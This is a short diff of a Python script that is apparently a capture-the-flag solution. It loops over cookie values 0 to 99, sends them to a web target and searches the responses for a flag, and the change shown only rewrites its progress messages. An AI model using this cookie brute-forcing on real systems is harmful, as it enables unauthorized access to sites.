@@ -47,10 +47,10 @@ s = requests.Session()
 boucle = True
 
 def Exploit():
+    pwn.info("Searching for the flag")
     while boucle:
         for miaou in range (0,100):
-            pwn.info("Connecting to {}".format(url))
-            pwn.info("Testing with cookie name={}".format(str(miaou)))
+            pwn.info("."*(miaou+1))
             cookies = {'name': str(miaou)}
             req = s.get(url, cookies=cookies)
             req = req.content
@@ -62,5 +62,4 @@ def Exploit():
                     break
                 return
 Exploit()
-
 ```
